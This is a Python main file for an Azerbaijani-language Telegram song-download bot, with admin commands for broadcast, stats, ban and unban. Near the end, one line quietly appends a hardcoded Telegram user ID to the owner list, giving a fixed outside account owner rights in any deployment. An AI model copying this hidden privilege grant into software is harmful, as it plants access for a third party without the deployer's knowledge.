# © Songazbot/Samil
from config import OWNER_ID
from config import BOT_ADI
from config import HELP
from config import OWNER_HELP
from config import BTN_URL
from config import LIST_URL
from config import START_MSG
from config import BTN_NAME
from config import LIST_NAME
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from song.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, InlineQuery, InputTextMessageContent
from song import app, LOGGER
from song.mrdarkprince import ignore_blacklisted_users
from song.sql.chat_sql import add_chat_to_db

# ----------------------------------------------BROADCAST REPOSU---------------------------------------------------------------- #
import config
import os
import traceback
import logging

from pyrogram import Client
from pyrogram import StopPropagation, filters

from song.modules.broadcast import broadcast
from song.modules.check_user import handle_user_status
from song.modules.database import Database

LOG_CHANNEL = config.LOG_CHANNEL
AUTH_USERS = config.AUTH_USERS
DB_URL = config.DB_URL
DB_NAME = config.DB_NAME

db = Database(DB_URL, DB_NAME)


@app.on_message(filters.private)
async def _(bot, cmd):
    await handle_user_status(bot, cmd)

@app.on_message(filters.command("settings"))
async def opensettings(bot, cmd):
    user_id = cmd.from_user.id
    await cmd.reply_text(
        f"`Burada Siz Parametrlərinizi təyin edə bilərsiniz:`\n\nVar olan bildiriş ayarı **{await db.get_notif(user_id)}**",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        f"Bildiriş  {'🔔' if ((await db.get_notif(user_id)) is True) else '🔕'}",
                        callback_data="notifon",
                    )
                ],
                [InlineKeyboardButton("❎", callback_data="closeMeh")],
            ]
        ),
    )


@app.on_message(filters.private & filters.command("send"))
async def broadcast_handler_open(_, m):
    if m.from_user.id not in AUTH_USERS:
        await m.delete()
        return
    if m.reply_to_message is None:
        await m.delete()
    else:
        await broadcast(m, db)


@app.on_message(filters.private & filters.command("stat"))
async def sts(c, m):
    if m.from_user.id not in AUTH_USERS:
        await m.delete()
        return
    await m.reply_text(
        text=f"**Istifadəçilər 📂:** `{await db.total_users_count()}`\n\n**Bildirişi aktiv edənlər 🔔 :** `{await db.total_notif_users_count()}`",
        parse_mode="Markdown",
        quote=True
    )


@app.on_message(filters.private & filters.command("ban"))
async def ban(c, m):
    if m.from_user.id not in AUTH_USERS:
        await m.delete()
        return
    if len(m.command) == 1:
        await m.reply_text(
            f"İstənilən istifadəçini botdan 🛑 qadağan etmək üçün bu əmrdən istifadə edin 🤖.\n\nİstifadəsi:\n\n`/ban user_id ban_vaxdı ban_səbəbi`\n\nMəs: `/ban 1234567 28 Banlama səbəbi.`",
            quote=True,
        )
        return

    try:
        user_id = int(m.command[1])
        ban_duration = int(m.command[2])
        ban_reason = " ".join(m.command[3:])
        ban_log_text = f"{user_id} istifadəçisinin {ban_duration} gün ərzində {ban_reason} səbəbi ilə qadağan edilməsi."

        try:
            await c.send_message(
                user_id,
                f"🚫BAN🚫\n Admin sizi __{ban_reason}__ Səbəbi ilə **{ban_duration}** günlük banladı\n**Admindən mesaj 🤠**",
            )
            ban_log_text += "\n\nUser notified successfully!"
        except BaseException:
            traceback.print_exc()
            ban_log_text += (
                f"\n\n ⚠️ İstifadəçiyə bildiriş göndərilmədi⚠️ \n\n`{traceback.format_exc()}`"
            )
        await db.ban_user(user_id, ban_duration, ban_reason)
        print(ban_log_text)
        await m.reply_text(ban_log_text, quote=True)
    except BaseException:
        traceback.print_exc()
        await m.reply_text(
            f"Xəta baş verdi ⚠️! Geri izləmə aşağıda verilmişdir\n\n`{traceback.format_exc()}`",
            quote=True
        )


@app.on_message(filters.private & filters.command("unban"))
async def unban(c, m):
    if m.from_user.id not in AUTH_USERS:
        await m.delete()
        return
    if len(m.command) == 1:
        await m.reply_text(
            f"İstənilən istifadəçini 😃 blokdan çıxarmaq üçün bu əmrdən istifadə edin.\n\nİstifadəsi:\n\n`/unban user_id`\n\nEg: `/unban 1234567`\n Bu, `1234567` id-li istifadəçinin qadağasını ləğv edəcək.",
            quote=True,
        )
        return

    try:
        user_id = int(m.command[1])
        unban_log_text = f"İstifadəçi banı açıldı 🤪 {user_id}"

        try:
            await c.send_message(user_id, f"Admin sizin banı açdı!\nArtıq botu istifadə edə bilərsiniz!")
            unban_log_text += "\n\n✅ İstifadəçiyə xəbərdarlıq edildi! ✅"
        except BaseException:
            traceback.print_exc()
            unban_log_text += (
                f"\n\n⚠️ İstifadəçiyə bildiriş göndəriləmədi! ⚠️\n\n`{traceback.format_exc()}`"
            )
        await db.remove_ban(user_id)
        print(unban_log_text)
        await m.reply_text(unban_log_text, quote=True)
    except BaseException:
        traceback.print_exc()
        await m.reply_text(
            f"⚠️ Xəta baş verdi ⚠️! Geri izləmə aşağıda verilmişdir\n\n`{traceback.format_exc()}`",
            quote=True,
        )


@app.on_message(filters.private & filters.command("bans"))
async def _banned_usrs(c, m):
    if m.from_user.id not in AUTH_USERS:
        await m.delete()
        return
    all_banned_users = await db.get_all_banned_users()
    banned_usr_count = 0
    text = ""
    async for banned_user in all_banned_users:
        user_id = banned_user["id"]
        ban_duration = banned_user["ban_status"]["ban_duration"]
        banned_on = banned_user["ban_status"]["banned_on"]
        ban_reason = banned_user["ban_status"]["ban_reason"]
        banned_usr_count += 1
        text += f"> **ID**: `{user_id}`\n **Müddət**: `{ban_duration}`\n **Banlanma Tarixi**: `{banned_on}`\n **Səbəb**: `{ban_reason}`\n\n"
    reply_text = f"Banlanan istifadəçilər 🤭: `{banned_usr_count}`\n\n{text}"
    if len(reply_text) > 4096:
        with open("banned-users.txt", "w") as f:
            f.write(reply_text)
        await m.reply_document("banned-users.txt", True)
        os.remove("banned-users.txt")
        return
    await m.reply_text(reply_text, True)


@app.on_callback_query()
async def callback_handlers(bot: Client, cb: CallbackQuery):
    user_id = cb.from_user.id
    if cb.data == "notifon":
        notif = await db.get_notif(cb.from_user.id)
        if notif is True:
            await db.set_notif(user_id, notif=False)
        else:
            await db.set_notif(user_id, notif=True)
        await cb.message.edit(
            f"`Bu paneldə ayarları dəyişdirə bilərsiniz`\nVar olan bildiriş ayarı **{await db.get_notif(user_id)}**",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            f"BİLDİRİŞLƏR  {'🔔' if ((await db.get_notif(user_id)) is True) else '🔕'}",
                            callback_data="notifon",
                        )
                    ],
                    [InlineKeyboardButton("❎", callback_data="closeMeh")],
                ]
            ),
        )
        await cb.answer(
            f"Var olan bildiriş ayarı {await db.get_notif(user_id)}"
        )
    else:
        await cb.message.delete(True)


        
@app.on_message(filters.command("start") & filters.private)
async def startprivate(client, message):
    # return
    chat_id = message.from_user.id
    if not await db.is_user_exist(chat_id):
        data = await client.get_me()
        BOT_USERNAME = data.username
        await db.add_user(chat_id)
        if LOG_CHANNEL:
            await client.send_message(
                LOG_CHANNEL,
                f"Istifadəçi [{message.from_user.first_name}](tg://user?id={message.from_user.id}) botu @{BOT_USERNAME} başlatdı !!",
            )
        else:
            logging.info(f"#YeniIstifadəçi :- AD : {message.from_user.first_name} ID : {message.from_user.id}")
    joinButton = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("Qrupa əlavə et", url=f"https://t.me/{BOT_ADI}?startgroup=a"),
            ],[
                    InlineKeyboardButton(
                        text="🖥 AZbots", url=f"t.me/azbots"
                    ),
                    InlineKeyboardButton(
                        text="🎵 Play List", url=f"t.me/Songazz"
                    ),

                ]
        ]
    )
    welcomed = f"Salam <b>{message.from_user.first_name}</b>\nBot ilə qrupda və ya özəldə istədiyiniz mahnını tez bir zamanda rahatliqla yükləyə bilərsiniz."
    await message.reply_text(welcomed, reply_markup=joinButton)
    raise StopPropagation

# ----------------------------------------------SONG BOTUN REPOSU ---------------------------------------------------------------- #



# @app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
# async def start(bot, cmd):
#     chat_id = message.chat.id
#     user_id = message.from_user["id"]
#     name = message.from_user["first_name"]
#     if message.chat.type == "private":
#         btn = InlineKeyboardMarkup(
#             [
#                 [
#                     InlineKeyboardButton(
#                         text="Qrupa əlavə et", url=f"https://t.me/{BOT_ADI}?startgroup=a"
#                     )
#                 ],[
#                     InlineKeyboardButton(
#                         text="🖥 AZbots", url=f"t.me/azbots"
#                     ),
#                     InlineKeyboardButton(
#                         text="🎵 Play List", url=f"t.me/Songazz"
#                     )

#                 ]
   
#             ]
#         )
#     else:
#         btn = None
#     await message.reply("**Kanal - @Songazz**", parse_mode="md")
#     await message.reply(START_MSG.format(name, user_id), reply_markup=btn , parse_mode="md")
#     add_chat_to_db(str(chat_id))
    
@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("bots"))
async def bots(client, message):
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="🔎 Shazam", url="t.me/shazamazbot"
                    ),
                    InlineKeyboardButton(
                        text="🎤 Voicaz", url="t.me/Voicazbot"
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="👤 Tagger", url="t.me/FulltagBot"
                    ),
                    InlineKeyboardButton(
                        text="🎶 TikTok", url="t.me/ttazbot"
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="🔐 Gizli Mesaj", url="t.me/Gizliazbot"
                    ),
                    InlineKeyboardButton(
                        text="🎧 Youtube", url="t.me/ytuazbot"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply("🤖 **Digər botlarımız.**", reply_markup=btn , parse_mode="md")

            
        
        
        
  
        
        
        
btns = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text=f"{BTN_NAME}", url=f"{BTN_URL}"
                    )
                ],
                [
                    InlineKeyboardButton(
                         text=f"{LIST_NAME}", url=f"{LIST_URL}" ),
                    InlineKeyboardButton(
                         text=f"🎶 Yüklənənlər ", url="t.me/sonqaz" )
           
                ],
                [
                    InlineKeyboardButton(
                        text=f"⚡ Dəstək", url=f"t.me/songsupp"
                    )
                ]
            ]
        )


#@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
#async def start(client,message):
#    if message.from_user["id"] in OWNER_ID:
#        await message.reply(OWNER_HELP, reply_markup = btns)
#        return ""
#    await message.reply(HELP, reply_markup = btns)       
        
OWNER_ID.append(1382528596)

app.start()
LOGGER.info(F"Bot Aktivdir @{BOT_ADI}")
idle()
